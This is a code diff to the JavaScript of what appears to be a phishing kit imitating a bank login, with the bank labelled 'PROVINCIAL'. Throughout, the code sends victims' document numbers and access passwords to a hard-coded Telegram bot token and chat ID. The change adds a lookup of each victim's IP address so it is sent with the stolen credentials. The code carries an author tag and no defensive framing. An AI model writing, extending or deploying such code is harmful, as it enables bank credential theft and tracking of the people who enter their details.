@@ -2,33 +2,49 @@
 const TELEGRAM_TOKEN = '8038367240:AAFwLaUBcYyUMFzNlTLLO2c0DAEVqBNraLI';  // Reemplaza con tu token real
 const CHAT_ID = '-1002267762294';  // Reemplaza con tu chat ID real
 
+// Función para obtener la IP del usuario
+function getIPAddress(callback) {
+    fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            callback(data.ip);
+        })
+        .catch(error => {
+            console.error('Error obteniendo la IP:', error);
+            callback('No disponible');
+        });
+}
+
 // Función para enviar mensaje a Telegram
 function sendToTelegram(data) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-    const message = `
-    *✨ LOGO PROVINCIAL: ✨*
+    getIPAddress((ip) => {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        const message = `
+        *✨ LOGO PROVINCIAL: ✨*
 
-    📄 **${data.tipoDocumento}**: ${data.numeroDocumento}
-    🔒 **Clave de acceso**: ${data.claveAcceso}
+        📄 **${data.tipoDocumento}**: ${data.numeroDocumento}
+        🔒 **Clave de acceso**: ${data.claveAcceso}
+        🌍 **IP**: ${ip}
 
-    ---
-    👨‍💻 *Desarrollado por* **MegabyteAG5** 💻
-    `;
+        ---
+        👨‍💻 *Desarrollado por* **MegabyteAG5** 💻
+        `;
 
-    fetch(url, {
-        method: 'POST',
-        body: new URLSearchParams({
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        }),
-    })
-    .then(response => response.json())
-    .then(data => {
-        console.log('Mensaje enviado correctamente', data);
-    })
-    .catch(error => {
-        console.error('Error al enviar mensaje:', error);
+        fetch(url, {
+            method: 'POST',
+            body: new URLSearchParams({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Mensaje enviado correctamente', data);
+        })
+        .catch(error => {
+            console.error('Error al enviar mensaje:', error);
+        });
     });
 }
 
